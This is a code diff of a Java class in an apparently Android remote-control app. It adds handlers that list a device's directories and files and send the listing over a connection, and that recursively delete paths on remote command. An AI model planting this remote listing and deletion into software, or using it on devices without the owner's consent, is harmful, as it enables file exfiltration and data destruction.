@@ -6,13 +6,12 @@ import com.remo.Connections.Feature;
 
 import java.io.File;
 import java.io.UnsupportedEncodingException;
-import java.nio.charset.Charset;
 
 public class FileMan extends Feature {
     private static final char NamesSplitChar = '/'; //names
     private static final char TypeSplitChar = '\\'; // dir or file
-    private String path;
-    private String CurrentPath = "";
+
+    //private String CurrentPath = "";
     public FileMan(){
 
         UseMainConnection = false;
@@ -22,23 +21,46 @@ public class FileMan extends Feature {
 
     @Override
     public void AsyncTaskFunc(String Params) {
-        this.path = Params;
-        //Log.d("REMODROID",getList(path));
+        if(Params.split("=")[0].equals("L")){
+            try {
+                String toSend = getList(toMob(Params.split("=")[1]));
 
-        path += CurrentPath;
-        try {
-            String toSend = getList(path);
-
-            sendPacket(toSend.getBytes("UTF-8"));
-            Log.d("REMODROID",toSend);
-        } catch (UnsupportedEncodingException e) {
-            e.printStackTrace();
+                sendPacket(toSend.getBytes("UTF-8"));
+               // Log.d("REMODROID",toSend);
+            } catch (UnsupportedEncodingException e) {
+                Log.d("REMODROID","File List Ex");
+            }
         }
+        else if(Params.split("=")[0].equals("D")){
+            if(Params.split("=")[1].startsWith("SDCard")){
+                Log.e("REMODROID","Cant Delete from SD card");
+            }
+            Log.d("REMODROID","Deleting : "+toMob(Params.split("=")[1]));
+        }
+
     }
 
     @Override
     public void update(String Params) {
+        if(Params.split("=")[0].equals("L")){
+            try {
+                String toSend = getList(toMob(Params.split("=")[1]));
 
+                sendPacket(toSend.getBytes("UTF-8"));
+                //Log.d("REMODROID",toSend);
+            } catch (UnsupportedEncodingException e) {
+                Log.d("REMODROID","File List Ex");
+            }
+        }
+        else if(Params.split("=")[0].equals("D")){
+            if(Params.split("=")[1].startsWith("SDCard") || Params.split("=")[1].startsWith("/SDCard") ||Params.split("=")[1].startsWith("//SDCard")){
+                Log.e("REMODROID","Cant Delete from SD card");
+            }else {
+                Log.d("REMODROID","Deleting : "+toMob(Params.split("=")[1]));
+                delete(toMob(Params.split("=")[1]));
+            }
+
+        }
     }
 
     private String getList(String dir){
@@ -51,22 +73,6 @@ public class FileMan extends Feature {
                     sb.append("SDCard");
                 }
                 sb.append(TypeSplitChar);
-                return sb.toString();
-            case "Internal":
-
-                sb.append(getDirs(System.getenv("EXTERNAL_STORAGE")));
-                sb.append(TypeSplitChar);
-                sb.append(getFiles(System.getenv("EXTERNAL_STORAGE")));
-                CurrentPath += System.getenv("EXTERNAL_STORAGE");
-                break;
-            case "SDCard":
-//                sb.append(getDirs(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()));
-//                sb.append(TypeSplitChar);
-//                sb.append(getFiles(android.os.Environment.getExternalStorageDirectory().getAbsolutePath()));
-                sb.append(getDirs(System.getenv("SECONDARY_STORAGE")));
-                sb.append(TypeSplitChar);
-                sb.append(getFiles(System.getenv("SECONDARY_STORAGE")));
-                CurrentPath += System.getenv("SECONDARY_STORAGE");
                 break;
             default:
                 sb.append(getDirs(dir));
@@ -110,6 +116,38 @@ public class FileMan extends Feature {
 
     private boolean isSDMounted(){
        return android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
+    }
+
+
+    private String toMob(String path){
+        return path
+                .replace("Internal",System.getenv("EXTERNAL_STORAGE"))
+                .replace("SDCard",System.getenv("SECONDARY_STORAGE"));
+    }
+
+    private boolean delete(String dir) {
+        File file = new File(dir);
+        if(file == null  || !file.exists()) {
+            return false;
+        }
+
+        if(file.isDirectory()) {
+            File[] list = file.listFiles();
+
+            if(list != null) {
+
+                for(File item : list) {
+                    delete(item.getAbsolutePath());
+                }
+
+            }
+        }
+
+        if(file.exists()) {
+            file.delete();
+        }
+
+        return !file.exists();
     }
 
 
